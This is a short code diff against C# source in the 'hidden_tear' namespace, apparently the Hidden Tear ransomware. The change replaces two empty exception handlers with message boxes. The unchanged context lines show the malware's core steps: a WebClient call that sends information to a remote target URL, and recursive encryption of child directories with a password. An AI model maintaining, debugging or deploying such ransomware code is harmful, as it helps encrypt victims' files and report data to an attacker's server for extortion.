@@ -142,9 +142,9 @@ namespace hidden_tear
                 var fullUrl = targetURL + info;
                 var conent = new System.Net.WebClient().DownloadString(fullUrl);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                
+                MessageBox.Show(ex.ToString());
             }
         }
 
@@ -197,9 +197,9 @@ namespace hidden_tear
                 {
                     encryptDirectory(childDirectories[i], password);
                 }
-            } catch (Exception)
+            } catch (Exception ex)
             {
-
+                 MessageBox.Show(ex.ToString());
             }
         }
 
